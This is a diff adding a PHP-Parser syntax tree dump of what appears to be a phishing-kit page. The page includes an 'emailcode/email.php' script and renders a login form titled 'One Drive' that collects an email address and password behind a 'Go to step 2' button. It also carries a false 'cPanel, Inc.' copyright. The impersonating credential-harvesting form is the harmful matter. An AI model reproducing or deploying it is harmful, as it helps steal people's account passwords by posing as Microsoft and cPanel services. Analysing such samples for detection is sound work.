@@ -1,0 +1,35 @@
+[
+    {
+        "nodeType": "Stmt_Expression",
+        "expr": {
+            "nodeType": "Expr_Include",
+            "expr": {
+                "nodeType": "Scalar_String",
+                "value": "emailcode\/email.php",
+                "attributes": {
+                    "startLine": 2,
+                    "endLine": 2,
+                    "kind": 1
+                }
+            },
+            "type": 4,
+            "attributes": {
+                "startLine": 2,
+                "endLine": 2
+            }
+        },
+        "attributes": {
+            "startLine": 2,
+            "endLine": 4
+        }
+    },
+    {
+        "nodeType": "Stmt_InlineHTML",
+        "value": "<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <!-- Required meta tags -->\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"content-type\" content=\"text\/html\" \/>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    <title>One Drive<\/title>\n    <link rel=\"stylesheet\" type=\"text\/css\" href=\"css\/style.css\">\n    <!-- Font Awesome CSS -->\n    <link rel=\"stylesheet\" type=\"text\/css\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.7.0\/css\/font-awesome.min.css\">\n    <!-- Bootstrap CSS -->\n    <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0-alpha.6\/css\/bootstrap.min.css\" integrity=\"sha384-rwoIResjU2yc3z8GV\/NPeZWAv56rSmLldC3R\/AZzGRnGxQQKnKkoFVhFQhNUwEyJ\" crossorigin=\"anonymous\">\n    <!-- jQuery first, then Tether, then Bootstrap JS. -->\n    <script src=\"https:\/\/code.jquery.com\/jquery-3.1.1.slim.min.js\" integrity=\"sha384-A7FZj7v+d\/sdmMqp\/nOQwliLvUsJfDHW+k9Omg\/a\/EheAdgtzNs3hpfag6Ed950n\" crossorigin=\"anonymous\"><\/script>\n    <script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/tether\/1.4.0\/js\/tether.min.js\" integrity=\"sha384-DztdAPBWPRXSA\/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb\" crossorigin=\"anonymous\"><\/script>\n    <script src=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0-alpha.6\/js\/bootstrap.min.js\" integrity=\"sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn\" crossorigin=\"anonymous\"><\/script>\n<\/head>\n<body>\n\n<div class=\"webmail\">\n    <div class=\"container\">\n        <div class=\"row\">\n            <div class=\"col-md-2 col-lg-2 col-sm-2 col-xs-12\">\n\n            <\/div>\n            <div class=\"col-md-8 col-lg-8 col-sm-8 col-xs-12\">\n                <div class=\"webmaillogo\">\n                    <img class=\"img-fluid\" src=\"images\/webmaillogo.png\" alt=\"Logo\" \/>\n                <\/div>\n                <div class=\"webmailloginform\">\n                    <form methed=\"post\" action=\"\" name=\"webmail\">\n                    <div class=\"form-group orangeclr\">\n                        <label for=\"email\">Email Address<\/label>\n                        <div class=\"input-group mb-2 mr-sm-2 mb-sm-0\">\n                            <div class=\"input-group-addon\" style=\"width: 2.6rem\"><i class=\"fa fa-at\"><\/i><\/div>\n                            <input type=\"text\" name=\"email\" class=\"form-control\" id=\"email\"\n                                     placeholder=\"you@example.com\" required autofocus>\n                        <\/div>\n                    <\/div>\n                    <div class=\"form-group orangeclr\">\n                        <label class=\"\" for=\"password\">Password<\/label>\n                        <div class=\"input-group mb-2 mr-sm-2 mb-sm-0\">\n                            <div class=\"input-group-addon\" style=\"width: 2.6rem\"><i class=\"fa fa-key\"><\/i><\/div>\n                            <input type=\"password\" name=\"password\" class=\"form-control\" id=\"password\"\n                                   placeholder=\"Password\" required>\n                        <\/div>\n                    <\/div>\n                    <div class=\"gostepbtn\">\n                        <input type=\"hidden\" name=\"logintype\" value=\"webmail\">\n                        <input type=\"submit\" name=\"submit_btn\" value=\"Go to step 2\" class=\"gostep\" \/>\n                    <\/div>\n                 <\/form>\n                <\/div>\n            <\/div>\n            <div class=\"col-md-2 col-lg-2 col-sm-2 col-xs-12\">\n\n            <\/div>\n        <\/div>\n    <\/div>\n<\/div>\n<footer>\n    <div class=\"container\">\n        <div class=\"row\">\n            <div class=\"col-md-2 col-lg-2 col-sm-2 col-xs-12\"><\/div>\n            <div class=\"col-md-8 col-lg-8 col-sm-8 col-xs-12\">\n                <div class=\"footermenu\">\n                    <ul>\n                        <li><a href=\"#\">English<\/a><\/li>\n                        <li><a href=\"#\">Cestina<\/a><\/li>\n                        <li><a href=\"#\">Dansk<\/a><\/li>\n                        <li><a href=\"#\">Deutsch<\/a><\/li>\n                        <li><a href=\"#\">Espanol<\/a><\/li>\n                        <li><a href=\"#\">Spanish<\/a><\/li>\n                        <li><a href=\"#\">Arabic<\/a><\/li>\n                        <li><a href=\"#\">Espanollatinoamericano<\/a><\/li>\n                    <\/ul>\n                <\/div>\n            <\/div>\n            <div class=\"col-md-2 col-lg-2 col-sm-2 col-xs-12\"><\/div>\n        <\/div>\n        <div class=\"row\">\n            <div class=\"copyright\">\n                    Copyright &#169; 2018 cPanel, Inc.\n            <\/div>\n        <\/div>\n    <\/div>\n<\/footer>\n<\/body>\n<\/html>\n",
+        "attributes": {
+            "startLine": 4,
+            "hasLeadingNewline": true,
+            "endLine": 94
+        }
+    }
+]
